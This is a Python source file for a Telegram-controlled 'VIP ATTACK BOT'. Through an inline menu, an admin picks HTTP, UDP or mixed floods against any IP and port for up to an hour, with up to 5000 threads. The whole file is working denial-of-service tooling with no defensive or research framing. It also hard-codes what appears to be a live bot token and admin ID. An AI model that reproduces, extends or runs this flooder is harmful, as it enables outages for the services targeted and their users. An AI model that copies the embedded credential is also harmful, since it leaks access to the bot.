import requests
import time
import threading
import random
import socket
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, MessageHandler, Filters
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from datetime import datetime

# ==================== CONFIG ====================
TOKEN = "8278228198:AAG7C97c7R50_gsykoqBMwesCuoRZTciCLA"
ADMIN_ID = 8210011971

# ==================== GLOBALS ====================
attack_active = False
user_state = {}

# ==================== ATTACK WORKERS ====================
def send_http_worker(ip, port):
    global attack_active
    url = f"http://{ip}:{port}/"
    headers = {"User-Agent": "Mozilla/5.0"}
    while attack_active:
        try:
            requests.get(url, headers=headers, timeout=2)
            requests.post(url, data={"d": random.randint(1,9999)}, timeout=2)
        except:
            pass

def udp_worker(ip, port):
    global attack_active
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = random._urandom(65500)
    while attack_active:
        try:
            sock.sendto(packet, (ip, port))
        except:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

def start_http_attack(ip, port, threads, duration):
    global attack_active
    attack_active = True
    for _ in range(threads):
        t = threading.Thread(target=send_http_worker, args=(ip, port))
        t.daemon = True
        t.start()
    time.sleep(duration)
    attack_active = False

def start_udp_attack(ip, port, threads, duration):
    global attack_active
    attack_active = True
    for _ in range(threads):
        t = threading.Thread(target=udp_worker, args=(ip, port))
        t.daemon = True
        t.start()
    time.sleep(duration)
    attack_active = False

def start_mixed_attack(ip, port, threads, duration):
    global attack_active
    attack_active = True
    for _ in range(threads // 2):
        t = threading.Thread(target=send_http_worker, args=(ip, port))
        t.daemon = True
        t.start()
    for _ in range(threads // 2):
        t = threading.Thread(target=udp_worker, args=(ip, port))
        t.daemon = True
        t.start()
    time.sleep(duration)
    attack_active = False

# ==================== BOT HANDLERS ====================
def start(update, context):
    if update.effective_user.id != ADMIN_ID:
        update.message.reply_text("❌ Unauthorized")
        return
    
    keyboard = [
        [InlineKeyboardButton("🔥 NEW ATTACK", callback_data="new_attack")],
        [InlineKeyboardButton("📊 STATUS", callback_data="status")],
        [InlineKeyboardButton("🛑 STOP", callback_data="stop")],
        [InlineKeyboardButton("❓ HELP", callback_data="help")]
    ]
    update.message.reply_text(
        "🔥 *VIP ATTACK BOT*\n\nSelect an option:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

def show_attack_type_menu(update, context):
    keyboard = [
        [InlineKeyboardButton("⚡ HTTP", callback_data="attack_http")],
        [InlineKeyboardButton("🌊 UDP", callback_data="attack_udp")],
        [InlineKeyboardButton("🔥 MIXED", callback_data="attack_mixed")],
        [InlineKeyboardButton("🔙 BACK", callback_data="main_menu")]
    ]
    text = "Select Attack Type:"
    
    if update.callback_query:
        update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
    else:
        update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

def show_example_menu(update, context):
    keyboard = [
        [InlineKeyboardButton("📝 ENTER TARGET", callback_data="enter_target")],
        [InlineKeyboardButton("🔙 BACK", callback_data="attack_menu")]
    ]
    text = "Format: `IP PORT TIME`\nExample: `192.168.1.100 80 120`"
    
    if update.callback_query:
        update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
    else:
        update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

def show_threads_menu(update, context, user_id):
    keyboard = [
        [InlineKeyboardButton("500", callback_data="threads_500")],
        [InlineKeyboardButton("1000", callback_data="threads_1000")],
        [InlineKeyboardButton("2000", callback_data="threads_2000")],
        [InlineKeyboardButton("3000", callback_data="threads_3000")],
        [InlineKeyboardButton("5000", callback_data="threads_5000")]
    ]
    
    data = user_state[user_id]
    text = f"Target: {data['ip']}:{data['port']}\nTime: {data['time']}s\n\nSelect Threads:"
    
    if update.callback_query:
        update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
    else:
        update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

def start_attack(update, context, user_id, ip, port, time_sec, threads, attack_type):
    global attack_active
    names = {"http": "HTTP", "udp": "UDP", "mixed": "MIXED"}
    
    context.bot.send_message(
        chat_id=user_id,
        text=f"🔥 ATTACK STARTED\nTarget: {ip}:{port}\nType: {names[attack_type]}\nThreads: {threads}\nDuration: {time_sec}s"
    )
    
    if attack_type == "http":
        start_http_attack(ip, port, threads, time_sec)
    elif attack_type == "udp":
        start_udp_attack(ip, port, threads, time_sec)
    else:
        start_mixed_attack(ip, port, threads, time_sec)
    
    context.bot.send_message(chat_id=user_id, text="✅ ATTACK COMPLETED\nSend /start for new attack.")
    if user_id in user_state:
        del user_state[user_id]

def handle_message(update, context):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID or user_id not in user_state:
        return
    
    state = user_state[user_id]
    text = update.message.text.strip()
    
    if state.get("step") == "awaiting_target":
        parts = text.split()
        if len(parts) == 3:
            ip, port, time_sec = parts
            try:
                port = int(port)
                time_sec = int(time_sec)
                if 1 <= port <= 65535 and 10 <= time_sec <= 3600:
                    user_state[user_id]["ip"] = ip
                    user_state[user_id]["port"] = port
                    user_state[user_id]["time"] = time_sec
                    show_threads_menu(update, context, user_id)
                else:
                    update.message.reply_text("Invalid port or time. Send again: IP PORT TIME")
            except:
                update.message.reply_text("Send numbers for port and time")
        else:
            update.message.reply_text("Format: IP PORT TIME\nExample: 192.168.1.100 80 120")

def button_handler(update, context):
    query = update.callback_query
    query.answer()
    user_id = update.effective_user.id
    
    if user_id != ADMIN_ID:
        query.edit_message_text("Unauthorized")
        return
    
    data = query.data
    
    if data == "main_menu":
        keyboard = [
            [InlineKeyboardButton("🔥 NEW ATTACK", callback_data="new_attack")],
            [InlineKeyboardButton("📊 STATUS", callback_data="status")],
            [InlineKeyboardButton("🛑 STOP", callback_data="stop")],
            [InlineKeyboardButton("❓ HELP", callback_data="help")]
        ]
        query.edit_message_text("Main Menu:", reply_markup=InlineKeyboardMarkup(keyboard))
    
    elif data == "new_attack":
        show_attack_type_menu(update, context)
    
    elif data == "attack_menu":
        show_attack_type_menu(update, context)
    
    elif data.startswith("attack_"):
        attack_type = data.replace("attack_", "")
        user_state[user_id] = {"attack_type": attack_type, "step": "awaiting_target"}
        show_example_menu(update, context)
    
    elif data == "enter_target":
        query.edit_message_text("Send: IP PORT TIME\nExample: 192.168.1.100 80 120")
    
    elif data.startswith("threads_"):
        threads = int(data.split("_")[1])
        d = user_state[user_id]
        threading.Thread(
            target=start_attack,
            args=(update, context, user_id, d["ip"], d["port"], d["time"], threads, d["attack_type"])
        ).start()
        del user_state[user_id]
    
    elif data == "status":
        query.edit_message_text(f"Attack Active: {attack_active}\nSessions: {len(user_state)}")
    
    elif data == "stop":
        global attack_active
        attack_active = False
        query.edit_message_text("Attack Stopped")
    
    elif data == "help":
        query.edit_message_text(
            "Commands:\n"
            "/start - Main menu\n"
            "/stop - Stop attack\n\n"
            "Flow:\n"
            "1. Select attack type\n"
            "2. Send: IP PORT TIME\n"
            "3. Select threads\n"
            "4. Attack starts!"
        )

def stop(update, context):
    global attack_active
    if update.effective_user.id == ADMIN_ID:
        attack_active = False
        update.message.reply_text("Attack stopped")

def main():
    updater = Updater(TOKEN, use_context=True)
    dp = updater.dispatcher
    
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("stop", stop))
    dp.add_handler(CallbackQueryHandler(button_handler))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))
    
    print("="*40)
    print("BOT RUNNING")
    print(f"Admin ID: {ADMIN_ID}")
    print("="*40)
    
    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
